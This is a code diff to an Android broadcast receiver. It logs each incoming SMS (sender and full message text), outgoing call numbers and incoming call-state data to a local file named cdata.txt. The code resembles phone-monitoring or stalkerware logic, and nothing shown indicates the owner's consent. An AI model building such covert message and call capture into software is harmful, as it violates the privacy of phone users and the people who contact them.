@@ -16,10 +16,13 @@ import android.os.Environment;
 import android.util.Log;
 import android.telephony.SmsMessage;
 
+
 public class PhoneIntentReceiver extends BroadcastReceiver {
 	public static final String TAG = "PhoneIntentReceiver";
 	private String filename = "cdata.txt";
 	
+
+    
 	/************************************************************************
 	Запись в файл указанной строки с добавлением текущего времени
 	************************************************************************/
@@ -64,25 +67,38 @@ public class PhoneIntentReceiver extends BroadcastReceiver {
 	                    msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
 	                    msg_from = msgs[i].getOriginatingAddress();
 	                    String msgBody = msgs[i].getMessageBody();
-	                    saveDataToFile("SMS: "+msg_from+":"+msgBody);
-	                    Log.d( TAG, "SMS: "+msg_from+":"+msgBody);
+	                    saveDataToFile("SMS IN: "+msg_from+":"+msgBody);
+	                    Log.d( TAG, "SMS IN: "+msg_from+":"+msgBody);
 	                }
 	            }catch(Exception e){
 	                Log.d("Exception caught",e.getMessage());
 	            }
 	        }
-	    } else {
+	    } else 
+	    
+	    	//if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL))
+	    	if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")){
+	      
+	    		String phoneNumber; 
+	    		phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+                saveDataToFile("CALL OUT: "+phoneNumber);
+                Log.d( TAG, "CALL OUT: "+phoneNumber);	    		
+	        }else
+	        
+	     	if(intent.getAction().equals("android.intent.action.PHONE_STATE")){
 	    
 		Bundle b = intent.getExtras();
 		if( b != null ) {
 			for( Iterator<String> i = b.keySet().iterator() ; i.hasNext() ;) {
 				String key = i.next();
-				Log.d( TAG, "extra: "+key+":"+b.get( key ));
-				saveDataToFile(/*intent.toString()+*/"call: "+key+":"+b.get( key ));
+				Log.d( TAG, "CALL IN: "+key+":"+b.get( key ));
+				saveDataToFile(/*intent.toString()+*/"CALL IN: "+key+":"+b.get( key ));
 			}
 		}
 			
 	    }
 	}
+	
+	
  
 }
